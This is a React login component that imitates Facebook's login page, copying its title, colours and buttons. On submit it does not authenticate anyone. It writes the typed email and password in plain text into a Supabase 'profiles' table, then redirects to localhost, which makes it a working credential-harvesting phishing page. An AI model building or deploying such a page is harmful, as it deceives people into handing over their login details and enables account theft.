import React, { useState } from "react";
import { supabase } from "./supabaseClient";
import { useNavigate } from "react-router-dom";

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const navigate = useNavigate();

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      // Insert email and password into the public.profiles table
      const { data, error } = await supabase
        .from("profiles")
        .insert([{ email, password }])
        .select();

      if (error) throw error;

      console.log("User logged in:", data);
      window.location.href = "http://localhost:3000/";
    } catch (error) {
      console.error("Error logging in:", error.message);
    }
  };

  return (
    <div style={styles.container}>
      <div style={styles.loginBox}>
        <h2 style={styles.title}>Facebook</h2>
        <form onSubmit={handleLogin} style={styles.form}>
          <input
            type="email"
            placeholder="Email address"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            style={styles.input}
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            style={styles.input}
            required
          />
          <button type="submit" style={styles.button}>
            Log In
          </button>
        </form>
        <a href="/forgot-password" style={styles.link}>
          Forgotten password?
        </a>
        <hr style={styles.divider} />
        <button style={styles.createAccountButton}>Create New Account</button>
      </div>
    </div>
  );
};

const styles = {
  container: {
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    height: "100vh",
    backgroundColor: "#f0f2f5",
  },
  loginBox: {
    backgroundColor: "#fff",
    padding: "20px",
    borderRadius: "8px",
    boxShadow: "0 2px 4px rgba(0, 0, 0, 0.1)",
    width: "400px",
    textAlign: "center",
  },
  title: {
    fontSize: "24px",
    marginBottom: "20px",
    color: "#1877f2",
  },
  form: {
    display: "flex",
    flexDirection: "column",
  },
  input: {
    padding: "10px",
    marginBottom: "10px",
    borderRadius: "6px",
    border: "1px solid #ddd",
    fontSize: "16px",
  },
  button: {
    padding: "10px",
    backgroundColor: "#1877f2",
    color: "#fff",
    border: "none",
    borderRadius: "6px",
    fontSize: "16px",
    cursor: "pointer",
  },
  link: {
    color: "#1877f2",
    textDecoration: "none",
    fontSize: "14px",
    margin: "10px 0",
    display: "block",
  },
  divider: {
    border: "none",
    borderTop: "1px solid #ddd",
    margin: "20px 0",
  },
  createAccountButton: {
    padding: "10px",
    backgroundColor: "#42b72a",
    color: "#fff",
    border: "none",
    borderRadius: "6px",
    fontSize: "16px",
    cursor: "pointer",
  },
};

export default Login;